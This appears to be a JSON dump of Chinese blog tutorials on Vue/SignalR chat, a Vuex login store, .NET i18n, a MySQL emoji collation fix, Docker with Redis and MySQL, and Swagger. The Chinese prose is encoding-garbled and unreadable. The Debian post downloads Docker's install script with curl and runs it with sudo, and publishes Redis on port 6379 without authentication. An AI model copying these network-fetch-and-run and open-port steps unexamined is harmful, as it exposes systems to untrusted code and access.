æ¸…ç©ºè¾“å…¥æ¡† this.messageText = &#x27;&#x27;; &#125;) .catch(error =&gt; &#123; console.error(&#x27;Error sending message: &#x27;, error); &#125;); &#125; &#125;, created() &#123; this.hubConnection = new HubConnectionBuilder() .withUrl(&quot;/chatHub&quot;) // SignalR Hubçš„URL .build(); this.hubConnection.start() .then(() =&gt; console.log(&quot;SignalR connection established.&quot;)) .catch(err =&gt; console.error(&quot;SignalR connection failed: &quot;, err)); this.hubConnection.on(&quot;ReceiveMessage&quot;, (user, message) =&gt; &#123; this.messages.push(&#123; user, message &#125;); &#125;); &#125;&#125;&lt;/script&gt; &#x2F;chatHub æ˜¯æœåŠ¡ç«¯é€šè®¯åœ°å€ SignalRæœåŠ¡ç«¯ ğŸ‘‰ .NET SignalR Redis 3.åœ¨æ¨¡æ¿ä¸­æ˜¾ç¤ºæ¶ˆæ¯ æœ€åï¼Œåœ¨ä½ çš„Vueæ¨¡æ¿ä¸­æ˜¾ç¤ºä»SignalRæ”¶åˆ°çš„æ¶ˆæ¯ã€‚ 12345678910&lt;template&gt; &lt;div&gt; &lt;input type=&quot;text&quot; v-model=&quot;messageText&quot;&gt; &lt;button @click=&quot;sendMessage&quot;&gt;Send&lt;/button&gt; &lt;br&gt; &lt;div v-for=&quot;(message, index) in messages&quot; :key=&quot;index&quot;&gt; &lt;p&gt;&#123;&#123; message.user &#125;&#125;: &#123;&#123; message.message &#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªmessageTex è·å–ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬ç‚¹å‡»æŒ‰é’®Sendæ—¶ï¼Œä¼šè°ƒç”¨sendMessage æ–¹æ³•æ¥å‘é€æ¶ˆæ¯ç»™SignalR Hubã€‚å¹¶å°†è¾“å…¥æ¡†ä¸­çš„æ¶ˆæ¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒã€‚ 4.è¿è¡Œå®ä¾‹å¯ä»¥çœ‹åˆ°æ¶ˆæ¯å®æ—¶ä¼ é€’åˆ°å¦ä¸€ä¸ªå®¢æˆ·ç«¯â€‹â€‹ VuexVuex æ˜¯ Vue.js çš„çŠ¶æ€ç®¡ç†åº“ï¼Œç”¨äºé›†ä¸­ç®¡ç†åº”ç”¨çš„çŠ¶æ€ ç”¨äºå…¨å±€çŠ¶æ€ç®¡ç† æ•°æ®å…±äº« 1.å®‰è£…Vuex1npm install vuex â€‹â€‹ 2.å¯¼å…¥ä¾èµ– 1import &#123; createStore &#125; from &#x27;vuex&#x27;; è¿™é‡Œåšä¸ªç®€å•çš„ç™»å½•Vuex storeä¾‹å­ 123456789101112131415161718192021222324252627282930313233343536import &#123; createStore &#125; from &#x27;vuex&#x27;;import api from &#x27;../services/api&#x27;; export default createStore(&#123; state: &#123; isLoggedIn: false, user: null &#125;, mutations: &#123; login(state, user) &#123; state.isLoggedIn = true; state.user = user; &#125;, logout(state) &#123; state.isLoggedIn = false; state.user = null; &#125; &#125;, actions: &#123; async login(&#123; commit &#125;, loginForm) &#123; try &#123; const response = await api.post(&#x27;/api/userApi/GetUserByMobilePwd&#x27;, loginForm); // ç™»å½•æˆåŠŸï¼Œæ›´æ–°ç”¨æˆ·ä¿¡æ¯å¹¶è®¾ç½®ç™»å½•çŠ¶æ€ commit(&#x27;login&#x27;, response.data.rsData); //rsData return response.data; &#125; catch (error) &#123; // ç™»å½•å¤±è´¥ï¼ŒæŠ›å‡ºé”™è¯¯ throw new Error(error.response.data.message || &#x27;Login failed&#x27;); &#125; &#125;, logout(&#123; commit &#125;) &#123; // æ¸…é™¤ç”¨æˆ·ä¿¡æ¯å¹¶è®¾ç½®ç™»å½•çŠ¶æ€ä¸ºæœªç™»å½• commit(&#x27;logout&#x27;); &#125; &#125;&#125;); state å¯¹è±¡åŒ…å«åº”ç”¨çš„å…¨å±€çŠ¶æ€ï¼Œå…¶ä¸­ isLoggedIn æ˜¯å¦å·²ç»ç™»å½•ï¼Œuser å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ã€‚ mutations login æ–¹æ³•ç”¨äºå°†ç”¨æˆ·ç™»å½•çŠ¶æ€è®¾ç½®ä¸ºå·²ç™»å½•ï¼Œå¹¶å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼Œ logout æ–¹æ³•ç”¨äºå°†ç”¨æˆ·ç™»å½•çŠ¶æ€è®¾ç½®ä¸ºæœªç™»å½•ï¼Œå¹¶æ¸…ç©ºç”¨æˆ·ä¿¡æ¯ã€‚ actions login æ–¹æ³•ç”¨äºå‘èµ·ç™»å½•è¯·æ±‚ï¼Œå¹¶æ ¹æ®å“åº”ç»“æœæäº¤ login mutation æ¥æ›´æ–°ç”¨æˆ·ç™»å½•çŠ¶æ€å’Œç”¨æˆ·ä¿¡æ¯ï¼Œ logout æ–¹æ³•ç”¨äºå¤„ç†ç”¨æˆ·ç™»å‡ºé€»è¾‘ã€‚ getters åŒ…å«ä¸€äº›è®¡ç®—å±æ€§ï¼Œç”¨äºä» state ä¸­æ´¾ç”Ÿå‡ºä¸€äº›è¡ç”ŸçŠ¶æ€ã€‚ è¿™é‡Œçš„ isLoggedIn getter è¿”å› state.isLoggedInï¼Œä»¥ç¡®ä¿çŠ¶æ€çš„å“åº”æ€§ã€‚ 3.åœ¨Vueç»„ä»¶ä¸­ä½¿ç”¨ 12345//main.jsimport store from &#x27;./services/store.js&#x27;; ... app.provide(&#x27;store&#x27;, store) // æ³¨å…¥ Vuex store 4.ç¼–å†™ç»„ä»¶login logout 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div class=&quot;login-container&quot;&gt; &lt;div class=&quot;login-card&quot;&gt; &lt;h2 class=&quot;login-title&quot; style=&quot;margin-top: ;&quot;&gt;&#123;&#123; $t(&#x27;Login&#x27;) &#125;&#125;&lt;/h2&gt; &lt;form @submit.prevent=&quot;login&quot; class=&quot;login-form&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;mobile&quot;&gt;&#123;&#123; $t(&#x27;username&#x27;) &#125;&#125;&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;mobile&quot; v-model=&quot;loginForm.mobile&quot; &gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;pwd&quot;&gt;&#123;&#123; $t(&#x27;password&#x27;) &#125;&#125;&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;pwd&quot; v-model=&quot;loginForm.pwd&quot; &gt; &lt;/div&gt; &lt;button v-if=&quot;!isLoggedIn&quot; type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;&#123;&#123; $t(&#x27;Login&#x27;) &#125;&#125;&lt;/button&gt; &lt;/form&gt; &lt;div v-if=&quot;isLoggedIn&quot; class=&quot;user-info&quot;&gt; &lt;p&gt;Welcome, &#123;&#123; user &amp;&amp; user.UserName &#125;&#125;!&lt;/p&gt; &lt;button @click=&quot;logout&quot; class=&quot;btn btn-danger&quot;&gt;&#123;&#123; $t(&#x27;Logout&#x27;) &#125;&#125;&lt;/button&gt; &lt;/div&gt; &lt;!-- æ·»åŠ æŒ‰é’®ç”¨äºæµ‹è¯• &lt;button @click=&quot;checkIsLoggedIn&quot; class=&quot;btn btn-primary&quot;&gt;Check isLoggedIn&lt;/button&gt; --&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; 5.ç¼–å†™è„šæœ¬Vue3 setup() å‡½æ•°è®¾ç½®ç»„ä»¶é€»è¾‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445export default &#123; setup() &#123; const store = useStore(); const loginForm = ref(&#123; mobile: &#x27;&#x27;, pwd: &#x27;&#x27; &#125;); const isLoggedIn = computed(() =&gt; store.state.isLoggedIn); // ä½¿ç”¨ computed è·å–å“åº”å¼çš„ isLoggedIn const user = computed(() =&gt; store.state.user); // ä½¿ç”¨ computed è·å–å“åº”å¼çš„ user const login = async () =&gt; &#123; try &#123; console.log(&#x27;isLoggedIn before login:&#x27;, isLoggedIn.value); // åœ¨è°ƒç”¨æ¥å£å‰è¾“å‡º isLoggedIn const result = await store.dispatch(&#x27;login&#x27;, loginForm.value); if (result) &#123; console.log(&#x27;Login successful&#x27;); console.log(&#x27;isLoggedIn after login:&#x27;, isLoggedIn.value); // åœ¨è°ƒç”¨æ¥å£åè¾“å‡º isLoggedIn &#125; else &#123; console.error(&#x27;Login failed: Login unsuccessful&#x27;); &#125; &#125; catch (error) &#123; console.error(&#x27;Login failed:&#x27;, error.message); &#125; &#125;; const logout = async () =&gt; &#123; try &#123; await store.dispatch(&#x27;logout&#x27;); console.log(&#x27;Logout successful&#x27;); &#125; catch (error) &#123; console.error(&#x27;Logout failed:&#x27;, error.message); &#125; &#125;; // æ–°å¢æ–¹æ³•ç”¨äºæµ‹è¯• const checkIsLoggedIn = () =&gt; &#123; console.log(&#x27;isLoggedIn:&#x27;, isLoggedIn.value); &#125;; return &#123; loginForm, login, logout, isLoggedIn, user, checkIsLoggedIn &#125;; &#125;&#125;;&lt;/script&gt; å½“ isLoggedIn åœ¨ mutations ä¸­è¢«ä¿®æ”¹æ—¶ï¼Œç»„ä»¶ä¸­ä½¿ç”¨è¯¥å±æ€§çš„åœ°æ–¹ä¼šç«‹å³æ›´æ–°ã€‚ 6.è¿è¡Œå®ä¾‹â€‹â€‹ å½“ç„¶ï¼Œè¿˜æœ‰å¾ˆå¤šç»„ä»¶å€¼å¾—å­¦ä¹ ã€‚ æ„¿åœ¨å‰ç«¯çš„æ—…ç¨‹ï¼Œä¸æ–­è¿›æ­¥ï¼ğŸ¶","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"VUE","slug":"VUE","permalink":"https://banjinmei.github.io/tags/VUE/"}],"author":"mu"},{"title":".NET i18n ","slug":"NET-i18n","date":"2024-04-15T17:29:17.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/16/NET-i18n/","permalink":"https://banjinmei.github.io/2024/04/16/NET-i18n/","excerpt":"","text":"ç¯å¢ƒ WIN10 VS2022 .NET8 ğŸ‘‹åˆ›å»ºé¡¹ç›®â€‹ ğŸ‘€åˆ›å»ºResources ControllersHomeController.en.resx â€‹HomeController.fr.resx â€‹HomeController.zh.resx â€‹ ğŸŒ±Program.csæ·»åŠ å›½é™…åŒ–æ”¯æŒ12345678910111213141516171819202122// æ·»åŠ å›½é™…åŒ–æ”¯æŒbuilder.Services.AddLocalization(options =&gt;&#123; options.ResourcesPath = &quot;Resources&quot;;&#125;); var app = builder.Build(); // å¤šè¯­è¨€var supportedCultures = new List&lt;CultureInfo&gt; &#123; new CultureInfo(&quot;en&quot;), new CultureInfo(&quot;zh&quot;), new CultureInfo(&quot;fr&quot;), &#125;; app.UseRequestLocalization(new RequestLocalizationOptions&#123; DefaultRequestCulture = new RequestCulture(&quot;zh&quot;), SupportedCultures = supportedCultures, SupportedUICultures = supportedCultures&#125;); âš¡æ³¨å…¥localizer123456789 private readonly IStringLocalizer&lt;HomeController&gt; localizer; public HomeController(ILogger&lt;HomeController&gt; logger, IStringLocalizer&lt;HomeController&gt; localizer)&#123; _logger = logger; this.localizer = localizer;&#125; ğŸ“«ç¼–å†™è°ƒç”¨æ–¹æ³• [HttpGet] public ActionResult&lt;string&gt; Get() &#123; string rsstr= localizer.GetString(&quot;String1&quot;).Value;//?ui-culture=zh return rsstr; &#125; é»˜è®¤æ˜¯ä¸­æ–‡ ?ui-culture&#x3D;en åˆ™å–å¯¹åº”HomeController.en.resx é‡Œé¢çš„String1 â€‹ â€‹ ğŸŸ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"i18n","slug":"i18n","permalink":"https://banjinmei.github.io/tags/i18n/"}],"author":"mu"},{"title":"MySQL Incorrect string value ","slug":"MySQL-Incorrect","date":"2024-04-13T01:27:51.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/13/MySQL-Incorrect/","permalink":"https://banjinmei.github.io/2024/04/13/MySQL-Incorrect/","excerpt":"","text":"MySQLå­˜å‚¨IOSä¼ è¿‡æ¥emojié”™è¯¯å¤„ç† Incorrect string value: â€˜â€˜ for column â€˜xxxâ€˜ at rowMySQL Incorrect string value: â€˜\\xF0\\x9F\\x8D\\xBAâ€˜ for column â€˜xxxâ€˜ at row â€‹ è°ƒç”¨æ¥å£æç¤º Incorrect string value: â€˜\\xF0\\x9F\\x8D\\xBAâ€™ for column â€˜xxxâ€™ at row ğŸ˜µâ€ğŸ’« éœ€è¦æŠŠmysqlå­—æ®µæ’åºè§„åˆ™ utf8mb4_0900_ai_ci æ”¹æˆ utf8mb4_unicode_ci â€‹ ğŸ’¤SQLè°ƒæ•´ALTER TABLE MUser CHANGE Signature Signature VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL; è®¾ç½®è¯¥åˆ—çš„å­—ç¬¦é›†ä¸ºutf8mb4ã€‚utf8mb4æ˜¯MySQLä¸­çš„ä¸€ä¸ªå­—ç¬¦é›†ï¼Œå®ƒå¯ä»¥å­˜å‚¨å››å­—èŠ‚çš„UTF-8å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥æ”¯æŒæ›´å¤šçš„Unicodeå­—ç¬¦ï¼Œå¦‚æŸäº›è¡¨æƒ…ç¬¦å·ã€‚ è®¾ç½®è¯¥åˆ—çš„æ ¡å¯¹è§„åˆ™ä¸ºutf8mb4_unicode_ciã€‚æ ¡å¯¹è§„åˆ™å†³å®šäº†å­—ç¬¦å¦‚ä½•æ¯”è¾ƒå’Œæ’åºã€‚utf8mb4_unicode_ciæ˜¯ä¸€ä¸ªä¸åŒºåˆ†å¤§å°å†™çš„æ ¡å¯¹è§„åˆ™ï¼Œå®ƒåŸºäºUnicodeæ ‡å‡†ã€‚ ALTER DATABASE IDB CHARACTER SET &#x3D; utf8mb4 COLLATE &#x3D; utf8mb4_unicode_ci; è®¾ç½®è¯¥æ•°æ®åº“çš„å­—ç¬¦é›†ä¸ºutf8mb4ã€‚ è®¾ç½®è¯¥æ•°æ®åº“çš„æ ¡å¯¹è§„åˆ™ä¸ºutf8mb4_unicode_ciã€‚ â€‹ ğŸ’¤æœåŠ¡ç«¯è¿æ¥è°ƒæ•´ ChatSet utf8mb4 â€‹ ğŸ’¤Runingâ€‹ â€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"}],"author":"mu"},{"title":"Debian Docker Redis ","slug":"debian-docker-reids","date":"2024-04-12T01:27:49.000Z","updated":"2024-11-13T16:34:44.090Z","comments":true,"path":"2024/04/12/debian-docker-reids/","permalink":"https://banjinmei.github.io/2024/04/12/debian-docker-reids/","excerpt":"","text":"Debianå®‰è£…docker 1.ä½¿ç”¨å®˜æ–¹è„šæœ¬è‡ªåŠ¨å®‰è£…dockerå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š 12curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh å¦‚æœå®‰è£…æç¤º -bash sudo command not found åˆ™éœ€è¦ 123#updatesudo apt-get updatesudo apt-get install sudo å†æ‰§è¡Œå®‰è£…è„šæœ¬1 å®‰è£…æˆåŠŸåå¯ä»¥è¾“å…¥ dockerå‘½ä»¤æŸ¥çœ‹dockerç‰ˆæœ¬ 12#versiondocker --version èƒ½æŸ¥åˆ°è¡¨æ˜å®‰è£…æˆåŠŸ 2.pull redis123#pull redisdocker pull redis:latestpull redisé•œåƒ 3.åˆ›å»ºreidså®¹å™¨1docker run -itd --name redis-test -p 6379:6379 redis 4.æµ‹è¯•redis12345docker exec -it redis-test /bin/bash redis-cliset test 1 get test set test 1 æç¤ºok 1get test ä¸€äº›å‘½ä»¤ 1234567891011#imagesdocker images#redisdocker pull redis:latestdocker run -itd --name redis-test -p 6379:6379 redis#test redisdocker exec -it redis-test /bin/bash - redis-cliset test 1 get test æŒä¹…åŒ– 1docker run --name some-redis -p 6379:6379 -v /path/to/redis/data:/data -d redis è¿™é‡Œçš„ &#x2F;path&#x2F;to&#x2F;redis&#x2F;data æ˜¯ä½ æœ¬åœ°çš„ä¸€ä¸ªè·¯å¾„ï¼Œ&#x2F;data æ˜¯å®¹å™¨å†… Redis æ•°æ®å­˜å‚¨çš„é»˜è®¤ä½ç½®ã€‚ -v å‚æ•°æ¥æŒ‚è½½ä¸€ä¸ªæœ¬åœ°ç›®å½•ä½œä¸ºæ•°æ®å·","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"Reids","slug":"Reids","permalink":"https://banjinmei.github.io/tags/Reids/"}],"author":"mu"},{"title":".NET SignalR Redis ","slug":"NET-SignalR-Redis","date":"2024-04-11T23:44:04.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/12/NET-SignalR-Redis/","permalink":"https://banjinmei.github.io/2024/04/12/NET-SignalR-Redis/","excerpt":"","text":"ç¯å¢ƒ Win10 VS2022 .NET8 Docker Redis å‰è¨€ ä»€ä¹ˆæ˜¯ SignalRï¼ŸASP.NET Core SignalR æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç åº“ï¼Œå¯ç”¨äºç®€åŒ–å‘åº”ç”¨æ·»åŠ å®æ—¶ Web åŠŸèƒ½ã€‚ å®æ—¶ Web åŠŸèƒ½ä½¿æœåŠ¡å™¨ç«¯ä»£ç èƒ½å¤Ÿå°†å†…å®¹æ¨é€åˆ°å®¢æˆ·ç«¯ã€‚ é€‚åˆ SignalR çš„å€™é€‰é¡¹ï¼š éœ€è¦ä»æœåŠ¡å™¨è¿›è¡Œé«˜é¢‘ç‡æ›´æ–°çš„åº”ç”¨ã€‚ ï¼ˆæ¸¸æˆã€ç¤¾äº¤ç½‘ç»œã€æŠ•ç¥¨ã€æ‹å–ã€åœ°å›¾å’Œ GPS åº”ç”¨ï¼‰ä»ªè¡¨æ¿å’Œç›‘è§†åº”ç”¨ã€‚ ï¼ˆå…¬å¸ä»ªè¡¨æ¿ã€å³æ—¶é”€å”®æ›´æ–°æˆ–å‡ºè¡Œè­¦æŠ¥ï¼‰åä½œåº”ç”¨ã€‚ ï¼ˆåŒ…æ‹¬ç™½æ¿åº”ç”¨å’Œå›¢é˜Ÿä¼šè®®è½¯ä»¶ï¼‰éœ€è¦é€šçŸ¥çš„åº”ç”¨ã€‚ï¼ˆ ç¤¾äº¤ç½‘ç»œã€ç”µå­é‚®ä»¶ã€èŠå¤©ã€æ¸¸æˆç­‰ï¼‰SignalR æä¾›ç”¨äºåˆ›å»ºæœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ (RPC) APIã€‚ RPC ä»æœåŠ¡å™¨ç«¯ .NET Core ä»£ç è°ƒç”¨å®¢æˆ·ç«¯ä¸Šçš„å‡½æ•°ã€‚æ”¯æŒJavaScript ï¼Œ.NET ï¼ŒJAVAï¼ŒSwift ï¼ˆå®˜æ–¹æ²¡æœ‰æ˜ç¡®æ”¯æŒï¼Œè¿™æ˜¯ç¬¬ä¸‰æ–¹åº“ï¼‰å…¶ä¸­æ¯ä¸ªå¹³å°éƒ½æœ‰å„è‡ªçš„å®¢æˆ·ç«¯ SDKã€‚ å› æ­¤ï¼ŒRPC è°ƒç”¨æ‰€è°ƒç”¨çš„ç¼–ç¨‹è¯­è¨€æœ‰æ‰€ä¸åŒã€‚ ASP.NET Core SignalR çš„ä¸€äº›åŠŸèƒ½ï¼š è‡ªåŠ¨å¤„ç†è¿æ¥ç®¡ç†ã€‚åŒæ—¶å‘æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚ ä¾‹å¦‚èŠå¤©å®¤ã€‚å‘ç‰¹å®šå®¢æˆ·ç«¯æˆ–å®¢æˆ·ç«¯ç»„å‘é€æ¶ˆæ¯ã€‚å¯¹å…¶è¿›è¡Œç¼©æ”¾ï¼Œä»¥å¤„ç†ä¸æ–­å¢åŠ çš„æµé‡ã€‚SignalR ä¸­å¿ƒåè®®1.ğŸ‘‹nugetå¼•å…¥SignalRâ€‹â€‹â€‹ 2.ğŸ‘€åˆ›å»ºSignalR Hub 12345678910111213141516using Microsoft.AspNetCore.SignalR;using System.Threading.Tasks; namespace WebSignalR&#123; public class ChatHub : Hub &#123; public async Task SendMessage(string user, string message) &#123; await Clients.All.SendAsync(&quot;ReceiveMessage&quot;, user, message); &#125; &#125; &#125; 3.ğŸŒ± Program.csæ·»åŠ SignalRæœåŠ¡ (Startup.cs) 12345678910//æ·»åŠ SignalRæœåŠ¡ builder.Services.AddSignalR();builder.Services.AddControllersWithViews();app.UseEndpoints(endpoints =&gt;&#123; endpoints.MapHub&lt;ChatHub&gt;(&quot;/chathub&quot;); endpoints.MapControllerRoute( name: &quot;default&quot;, pattern: &quot;&#123;controller=Home&#125;/&#123;action=Index&#125;/&#123;id?&#125;&quot;);&#125;); 4.ğŸ“« æ·»åŠ å‰ç«¯ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839&lt;div class=&quot;text-center&quot;&gt; &lt;div id=&quot;chat-container&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;userInput&quot; placeholder=&quot;Your name&quot; /&gt; &lt;input type=&quot;text&quot; id=&quot;messageInput&quot; placeholder=&quot;Type a message...&quot; /&gt; &lt;button id=&quot;sendButton&quot;&gt;Send&lt;/button&gt; &lt;ul id=&quot;messagesList&quot;&gt;&lt;/ul&gt; &lt;/div&gt; &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/microsoft-signalr/5.0.12/signalr.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; const connection = new signalR.HubConnectionBuilder() .withUrl(&quot;/chathub&quot;) .build(); connection.on(&quot;ReceiveMessage&quot;, function (user, message) &#123; const encodedUser = user.replace(/&amp;/g, &quot;&amp;amp;&quot;).replace(/&lt;/g, &quot;&amp;lt;&quot;).replace(/&gt;/g, &quot;&amp;gt;&quot;); const encodedMessage = message.replace(/&amp;/g, &quot;&amp;amp;&quot;).replace(/&lt;/g, &quot;&amp;lt;&quot;).replace(/&gt;/g, &quot;&amp;gt;&quot;); const li = document.createElement(&quot;li&quot;); li.textContent = `$&#123;encodedUser&#125;: $&#123;encodedMessage&#125;`; document.getElementById(&quot;messagesList&quot;).appendChild(li); &#125;); connection.start().catch(function (err) &#123; return console.error(err.toString()); &#125;); document.getElementById(&quot;sendButton&quot;).addEventListener(&quot;click&quot;, function (event) &#123; const user = document.getElementById(&quot;userInput&quot;).value; const message = document.getElementById(&quot;messageInput&quot;).value; connection.invoke(&quot;SendMessage&quot;, user, message).catch(function (err) &#123; return console.error(err.toString()); &#125;); event.preventDefault(); &#125;); &lt;/script&gt; &lt;/div&gt; 5.âš¡F5è¿è¡Œâ€‹â€‹â€‹ å‡çº§ä¼˜åŒ– å°è£…Msg 1234567891011public class Msg&#123; public string? user &#123; get; set; &#125; public string? message &#123; get; set; &#125;&#125;//sendMessage public async Task SendMessage(Msg entity) &#123; if (Clients != null) await Clients.All.SendAsync(&quot;ReceiveMessage&quot;, entity.user, entity.message);// $&quot;&#123;entity.user&#125; å‘é€æ¶ˆæ¯ï¼š&#123;entity.message&#125;&quot;); &#125; å‰ç«¯ connection.invoke(â€œSendMessageâ€ â€¦ ä¼ é€’msgå¯¹è±¡è¿›æ¥å³å¯ 6.ğŸ’ªè·¨åŸŸé—®é¢˜ 1234567891011builder.Services.AddCors(options =&gt;&#123; options.AddPolicy(&quot;CorsPolicy&quot;, builder =&gt; builder .AllowAnyMethod() .AllowAnyHeader() .WithOrigins(&quot;http://localhost:5173&quot;) // æ›¿æ¢ä¸ºä½ å…è®¸çš„æ¥æº .AllowCredentials());&#125;);//é€šè¿‡æ·»åŠ app.UseCors(&quot;CorsPolicy&quot;)ä¸­é—´ä»¶æ¥å¯ç”¨è·¨åŸŸæ”¯æŒapp.UseCors(&quot;CorsPolicy&quot;); ä¸Šé¢ä»£ç ä¸­çš„WithOriginsæ–¹æ³•æŒ‡å®šäº†å…è®¸è®¿é—®SignalRç«¯ç‚¹çš„æ¥æºã€‚å°†â€‹â€","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Redis","slug":"Redis","permalink":"https://banjinmei.github.io/tags/Redis/"},{"name":"SignalR","slug":"SignalR","permalink":"https://banjinmei.github.io/tags/SignalR/"}],"author":"mu"},{"title":".NET Swagger ","slug":"NET-Swagger","date":"2024-04-11T15:27:19.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/11/NET-Swagger/","permalink":"https://banjinmei.github.io/2024/04/11/NET-Swagger/","excerpt":"","text":"å¼€å‘ç¯å¢ƒ Win10 VS2022 .NET8.0 1.ä»NuGetæ·»åŠ Swaggerâ€‹ åœ¨è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ä¸­å³é”®å•å‡»é¡¹ç›®&gt;ç®¡ç† NuGet åŒ…å°†åŒ…æºè®¾ç½®ä¸ºâ€œnuget.orgâ€ç¡®ä¿å¯ç”¨â€œåŒ…æ‹¬é¢„å‘è¡Œâ€é€‰é¡¹åœ¨æœç´¢æ¡†ä¸­è¾“å…¥â€œSwashbuckle.AspNetCoreâ€ä»â€œæµè§ˆâ€é€‰é¡¹å¡ä¸­é€‰æ‹©æœ€æ–°çš„â€œSwashbuckle.AspNetCoreâ€åŒ…ï¼Œç„¶åå•å‡»â€œå®‰è£…â€ 2.å°† Swagger ç”Ÿæˆå™¨æ·»åŠ åˆ°ä»¥ä¸‹ä½ç½®çš„æœåŠ¡é›†åˆä¸­Program.csï¼š1234builder.Services.AddControllers(); builder.Services.AddEndpointsApiExplorer();builder.Services.AddSwaggerGen(); â€‹ å¯ç”¨ä¸­é—´ä»¶ ç”Ÿæˆ 12345678app.UseSwagger();app.UseSwaggerUI(); app.UseSwaggerUI(options =&gt;&#123; options.SwaggerEndpoint(&quot;/swagger/v1/swagger.json&quot;, &quot;v1&quot;); options.RoutePrefix = string.Empty;&#125;); â€‹ 3.æ·»åŠ APIæ§åˆ¶å™¨åˆ›å»ºapi 1234567891011121314151617181920212223242526272829303132333435// GET api/&lt;myapi&gt;/5/// &lt;summary&gt;/// getid/// &lt;/summary&gt;/// &lt;param name=&quot;id&quot;&gt;idå‚æ•°&lt;/param&gt;/// &lt;returns&gt;valuestr&lt;/returns&gt;[HttpGet(&quot;&#123;id&#125;&quot;)]public string Get(int id)&#123; return &quot;value&quot; + id;&#125; // POST api/&lt;myapi&gt;[HttpPost]public string Post([FromBody] string value)&#123; //posté€»è¾‘ä»£ç  return &quot;myPost&quot;;&#125; // PUT api/&lt;myapi&gt;/5[HttpPut(&quot;&#123;id&#125;&quot;)]public string Put(int id, [FromBody] string value)&#123; //puté€»è¾‘ä»£ç  return &quot;myPut&quot;;&#125; // DELETE api/&lt;myapi&gt;/5[HttpDelete(&quot;&#123;id&#125;&quot;)]public string Delete(int id)&#123; //deleteé€»è¾‘ä»£ç  return &quot;myDelete&quot;;&#125; â€‹ 4.F5è¿è¡Œ è®¿é—®&#x2F;swagger&#x2F;index.htmlâ€‹ 5.try it outæµ‹è¯•APIâ€‹ çœ‹åˆ°è¿”å›äº† value111 å³æ¥å£æ²¡é—®é¢˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Swagger","slug":"Swagger","permalink":"https://banjinmei.github.io/tags/Swagger/"}],"author":"mu"},{"title":"Docker MySQL ","slug":"Docker-MySQL","date":"2024-04-11T00:35:22.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/11/Docker-MySQL/","permalink":"https://banjinmei.github.io/2024/04/11/Docker-MySQL/","excerpt":"","text":"1.ä¸‹è½½docker desktophttps://www.docker.com/products/docker-desktop/ åˆ›å»ºå®¹å™¨1docker run åˆ›å»ºå¹¶å¯åŠ¨mysqlå®¹å™¨ â€“name å®¹å™¨åå­— -d åå°è¿è¡Œå®¹å™¨ -p æ˜ å°„ç«¯å£ -e å‚æ•° æˆªè‡³ç›®å‰æœ€æ–°çš„mysqlæ˜¯mysql8.0.36 é‚£å°±æ•´è¿™ä¸ªè¯•ä¸‹ã€‚ 1docker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=ä½ çš„å¯†ç  mysql:8.0.36-debian â€‹ ç­‰å¾…ä¸€ä¼šï¼Œçœ‹åˆ°mysqlå·²ç»pullä¸‹æ¥ã€‚ å›åˆ°dockerçœ‹åˆ°å®¹å™¨å·²ç»åˆ›å»ºã€‚ â€‹ â€‹ 